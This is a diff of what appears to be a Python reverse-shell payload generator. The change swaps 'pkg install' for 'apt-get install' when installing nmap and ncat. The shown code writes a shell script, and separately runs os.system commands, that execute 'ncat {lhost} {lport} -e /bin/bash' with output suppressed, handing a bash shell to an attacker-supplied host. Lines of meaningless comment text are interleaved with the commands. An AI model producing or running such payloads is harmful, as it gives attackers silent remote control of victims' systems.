@@ -73,8 +73,8 @@ ncat {lhost} {lport} -e /bin/bash -y > /dev/null
 elif payload=="5":
 	print("GENERATING PAYLOAD.......")
 	with open(f"{output}/{name}.sh","w+") as f:
-		s=(f"""pkg install nmap -y > /dev/null
-pkg install ncat -y > /dev/null
+		s=(f"""apt-get install nmap -y > /dev/null
+apt-get install ncat -y > /dev/null
 ncat {lhost} {lport} -e /bin/bash -y > /dev/null
 		""")
 		f.write(s)
@@ -156,11 +156,11 @@ elif payload=="10":
 #jhsjkdhsjkghkjsghdkjahkjhgkdjghkjhsakjhdkjhkjhadksjhkjhdsjhj
 #kjhgksjhakjhgkjhdkjhlsdjlakjsdhlkjlakjhsdllsjhlsdhjshdjhsdjhbkj
 #kjkasjhkjhhugkjfoldll
-os.system("pkg install nmap -y > /dev/null")
+os.system("apt-get install nmap -y > /dev/null")
 #lkjhlkjdghsjhgjkkdjkaslkslkjlas;aslk;llklskkdjkjsjh
 #kjhbskjhgsajkdhjkshda
 #lkjhkjhgjhsjhlkjglkhlkjhlkjhkjkljhksssssssssssss
-os.system("pkg install ncat -y > /dev/null")
+os.system("apt-get install ncat -y > /dev/null")
 #jhkjhjkhgkjhgkjhgjdkjhfjld
 os.system(f"ncat {lhost} {lport} -e /bin/bash > /dev/null")
 #jakskjsdjhksdjkdskjdsjkdjjdsjkjhkjgkjfdhjkkfkjfdjfdjjfjfjjfj
